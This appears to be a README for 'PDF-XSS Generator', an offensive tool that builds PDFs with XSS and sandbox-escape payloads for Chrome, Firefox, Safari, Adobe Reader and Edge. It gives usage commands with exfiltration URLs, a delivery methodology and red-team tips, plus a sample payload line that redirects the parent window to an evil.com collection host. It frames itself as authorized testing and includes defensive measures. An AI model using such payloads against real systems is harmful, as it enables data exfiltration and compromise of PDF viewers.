# PDF-XSS Generator v4.1

Advanced PDF sandbox escape and browser exploitation framework for authorized security testing.

## Overview

PDF-XSS Generator is a sophisticated security research tool that creates PDF files with targeted XSS payloads designed to escape PDF viewer sandboxes across multiple browsers. This tool generates single, comprehensive PDF files containing all payloads for a selected browser, with each payload on a separate page for easy reference and testing.

**Legal Notice**: This tool is for authorized security testing and educational purposes only. Ensure you have explicit permission before testing any systems.

## Features

- ✅ **5 Browser Targets**: Chrome/PDFium, Firefox/PDF.js, Safari/PDFKit, Adobe Reader, Microsoft Edge
- ✅ **184 Payloads**: Research-backed exploits across 5 browsers (87 Chrome, 28 Firefox, 22 Safari, 25 Adobe, 22 Edge)
- ✅ **Modern Evasion Techniques**: WebAssembly, crypto.subtle API, Service Workers, SharedArrayBuffer, Proxy handlers
- ✅ **Full Payload Visibility**: Complete JavaScript payloads visible in generated PDFs with word wrapping
- ✅ **OS-Aware Targeting**: Automatically adapts payloads for Windows, macOS, Linux, Android
- ✅ **Production Logging**: Structured logging with configurable levels (DEBUG, INFO, WARNING, ERROR)
- ✅ **No External Dependencies**: Uses Python 3 standard library only
- ✅ **Single Executable**: One tool handles all payload generation and configuration

## Quick Start

### Prerequisites
- Python 3.7+
- No additional dependencies required

### Installation

```bash
cd PDF-XSS
# No installation needed - uses Python standard library
```

### Basic Usage

```bash
# List available browsers and payload counts
python3 pdf_xss_generator.py --list-browsers

# Generate Chrome PDF with all payloads
python3 pdf_xss_generator.py -b chrome -u http://your-exfil-server.com

# Generate Firefox PDFs with limited payloads
python3 pdf_xss_generator.py -b firefox -u http://webhook.site/xyz --count 10

# Generate all browsers in a single PDF
python3 pdf_xss_generator.py -b all -u http://collaborator.burp.com

# Enable debug logging
python3 pdf_xss_generator.py -b safari -u http://test.com --log-level DEBUG

# Save logs to file
python3 pdf_xss_generator.py -b adobe -u http://test.com --log-file pdf_xss.log
```

## Command Line Reference

### Required Arguments
| Flag | Description | Example |
|------|-------------|---------|
| `-b, --browser` | Target browser (chrome, firefox, safari, adobe, edge, or all) | `-b chrome` |
| `-u, --url` | **REQUIRED** - Exfiltration target URL | `-u http://test.com` |

### Optional Arguments
| Flag | Description | Default |
|------|-------------|---------|
| `-o, --output-dir` | Output directory for PDFs | `Files` |
| `--count` | Limit number of payloads to generate | All payloads |
| `--pdf-version` | PDF version (1.0-2.0) | `1.7` |
| `--log-level` | Logging level (DEBUG, INFO, WARNING, ERROR) | `INFO` |
| `--log-file` | Path to log file (optional) | Console only |
| `--list-browsers` | List available browsers and exit | - |
| `--help` | Show help message | - |

## Payload Categories

### Chrome/PDFium (87 payloads)
- **DOM Access**: Parent/top window manipulation, cross-frame communication
- **Advanced Evasion**: WebAssembly, Proxy handlers, Reflect API, Symbol registry
- **File System**: Local file access, directory traversal
- **Network Exfiltration**: Fetch API, XMLHttpRequest, beacon requests
- **Sandbox Escape**: PDF sandbox restriction bypasses

### Firefox/PDF.js (28 payloads)
- **DOM Access**: Content Security Policy evasion techniques
- **Modern APIs**: Generator functions, Temporal objects, Intl APIs
- **Network Exfiltration**: Async-based data extraction
- **Error Handling**: Graceful fallback mechanisms

### Safari/PDFKit (22 payloads)
- **WebKit-Specific**: macOS integration, WebKit engine features
- **File System**: Local file access restrictions and bypasses
- **API Abuse**: Safari-specific PDF APIs
- **Performance APIs**: PerformanceObserver exploitation

### Adobe Reader (25 payloads)
- **Privileged APIs**: Full JavaScript API access
- **XFA Forms**: XML Forms Architecture exploitation
- **System Integration**: OS command execution
- **Multimedia**: Annotation and multimedia features

### Microsoft Edge (22 payloads)
- **Chromium Features**: Modern browser API exploitation
- **Windows Integration**: OS-specific features
- **WebView2**: Windows integration techniques

## Generated Output

All PDF files are created in the `Files/` directory with the naming pattern:

```
{browser}_all_payloads_{timestamp}.pdf
```

Example:
- `chrome_all_payloads_20260426_143022.pdf`
- `firefox_all_payloads_20260426_143025.pdf`

Each PDF contains:
- Multiple pages (one payload per page)
- Full payload code visible for reference
- Payload metadata (description, risk level, technique)
- Filename header for identification

## Configuration

The `config.json` file contains advanced configuration options:

```json
{
  "pdf_xss_config": {
    "generation": {
      "default_output_dir": "Files",
      "default_pdf_version": "1.7",
      "max_payloads_per_run": 100,
      "enable_os_detection": true,
      "enable_payload_validation": true
    },
    "browsers": {
      "chrome": { "json_file": "chrome.json", ... },
      ...
    }
  }
}
```

## Security Testing Methodology

### 1. Preparation
- Identify target PDF viewer (browser built-in, Adobe Reader, etc.)
- Set up exfiltration endpoint (webhook.site, Burp Collaborator, custom server)
- Prepare target URL with exfiltration endpoint

### 2. Payload Generation
```bash
python3 pdf_xss_generator.py -b {target_browser} -u {exfil_url}
```

### 3. Delivery & Testing
- Upload/embed PDF in target application
- Monitor for PDF viewer process activity
- Check exfiltration endpoint for data/callbacks
- Test across different PDF viewers
- Verify sandbox escape success

### 4. Analysis
- Review logs for payload execution details
- Document successful techniques
- Note browser/version-specific results
- Report findings responsibly

## Logging Output

The tool provides structured logging with timestamps:

```
2026-04-26 01:43:44,481 - INFO - PDF-XSS GENERATOR v4.1
2026-04-26 01:43:44,481 - INFO - Target Browser: chrome
2026-04-26 01:43:44,481 - INFO - Loaded 87 payloads for chrome from chrome.json
2026-04-26 01:43:44,482 - INFO - Creating single PDF file with 87 payloads (one per page)...
2026-04-26 01:43:44,482 - INFO - PDF file created: chrome_all_payloads_20260426_014344.pdf
```

### Log Levels

- **DEBUG**: Detailed payload information, validation results, processing steps
- **INFO**: Status updates, file creation, summary information (default)
- **WARNING**: Important notices, security warnings, deprecated features
- **ERROR**: Failures, missing files, invalid inputs

## Payload Database Structure

Each browser has a dedicated JSON file (e.g., `chrome.json`) with this structure:

```json
{
  "browser": "chrome",
  "payloads": [
    {
      "id": "chrome_dom_access_001",
      "category": "dom_access",
      "technique": "parent_window_access_2024",
      "payload": "try { if(typeof parent !== 'undefined' && parent.window) { parent.window.location='http://evil.com/collect'; } } catch(e) { ... }",
      "description": "Escape PDF sandbox by accessing parent window object",
      "risk_level": "high",
      "cve_reference": "CVE-2024-XXXXX"
    },
    ...
  ]
}
```

## Best Practices

### For Security Researchers
1. ✅ Always use explicit `-u` flag with target URL (no defaults)
2. ✅ Enable logging (`--log-level DEBUG`) for detailed analysis
3. ✅ Test payloads in isolated environments only
4. ✅ Document which techniques work on each browser/version
5. ✅ Share findings through responsible disclosure

### For Red Team Operations
1. ✅ Customize URL based on operation requirements
2. ✅ Use `--count` to limit payload size for delivery
3. ✅ Create multiple PDFs targeting different browsers
4. ✅ Review logs to identify successful exploitation vectors
5. ✅ Archive generated PDFs for post-assessment reporting

### For Blue Team Defense
1. ✅ Understand PDF viewer sandbox limitations
2. ✅ Implement strict file upload validation
3. ✅ Monitor PDF viewer process behavior
4. ✅ Disable PDF JavaScript execution where possible
5. ✅ Use additional sandboxing beyond PDF viewer defaults

## Defensive Measures

### PDF Sandbox Hardening
- **Disable PDF JavaScript**: Configure viewers to disable JavaScript
- **Upload Validation**: Implement file type and content analysis
- **Additional Sandboxing**: Use OS-level sandboxing beyond viewer defaults
- **Process Monitoring**: Monitor for unusual PDF viewer process behavior
- **Network Restrictions**: Block outbound connections from PDF viewers

### Application Controls
- **CSP Headers**: Implement Content Security Policy
- **File Restrictions**: Block PDF upload or restrict to safe viewers
- **User Education**: Train users on PDF security risks
- **Viewer Updates**: Keep PDF viewers patched and updated

## File Structure

```
PDF-XSS/
├── pdf_xss_generator.py    # Main executable (v4.1)
├── chrome.json             # Chrome/PDFium payloads (87)
├── firefox.json            # Firefox/PDF.js payloads (28)
├── safari.json             # Safari/PDFKit payloads (22)
├── adobe.json              # Adobe Reader payloads (25)
├── edge.json               # Microsoft Edge payloads (22)
├── config.json             # Configuration file
├── requirements.txt        # Python dependencies (empty)
├── README.md               # This file
└── Files/                  # Generated PDF output directory
```

## Troubleshooting

### "URL parameter is required" error
**Solution**: Always provide `-u` flag with target URL
```bash
python3 pdf_xss_generator.py -b chrome -u http://your-server.com
```

### "Browser file not found" error
**Solution**: Verify browser name is valid (chrome, firefox, safari, adobe, edge, all)
```bash
python3 pdf_xss_generator.py --list-browsers  # Check available browsers
```

### PDF files not created
**Solution**: Check that Files/ directory exists and is writable
```bash
mkdir -p Files/
python3 pdf_xss_generator.py -b chrome -u http://test.com
```

### Debug logging not showing
**Solution**: Use correct log level flag
```bash
python3 pdf_xss_generator.py -b chrome -u http://test.com --log-level DEBUG
```

## Research Foundation

This tool is built on extensive security research:

### PDF Security Research
- **50+ CVE References**: Covering major PDF rendering engines
- **Browser Engine Analysis**: PDFium, PDF.js, PDFKit, Acrobat JavaScript
- **Academic Papers**: PDF security, sandbox escapes, exploitation techniques
- **Bug Bounty Programs**: Verified vulnerabilities from HackerOne, Bugcrowd

### Key References
- PDF.js Security Documentation
- Chrome PDFium Security
- Firefox SpiderMonkey Engine
- Adobe Reader JavaScript API
- OWASP PDF Security Testing Guide

## Version History

- **v4.1** (Current): Consolidated architecture, single executable, production logging
- **v4.0**: Enhanced payloads, all-browser support, refined PDF generation
- **v3.0**: Testing framework, results analyzer, quality scoring
- **v2.0**: PDF sandbox escape enhancements, sophisticated payloads
- **v1.0**: Initial release, basic PDF generation

## Contributing

This is a research and security testing tool. For improvements or additional payloads:

1. Ensure payloads are thoroughly tested
2. Include CVE references and research citations
3. Follow the existing JSON schema
4. Test with multiple browser versions
5. Document any new features or techniques

## License

**Educational and Authorized Security Testing Only**

This project is for legitimate security research and authorized penetration testing. Users are responsible for ensuring they have explicit permission before testing any systems.

Unauthorized access to computer systems is illegal and may violate applicable laws.

## Support & Contact

For issues, questions, or contributions:
- Review the troubleshooting section above
- Check logs with `--log-level DEBUG`
- Verify JSON payload files are valid
- Test with `--list-browsers` to validate setup

---

**⚠️ SECURITY NOTICE**: These tools create files designed to exploit PDF viewer vulnerabilities. Use only in authorized, controlled testing environments with proper permission from system owners.

**Remember**: Always practice responsible disclosure and obtain proper authorization before testing any systems.
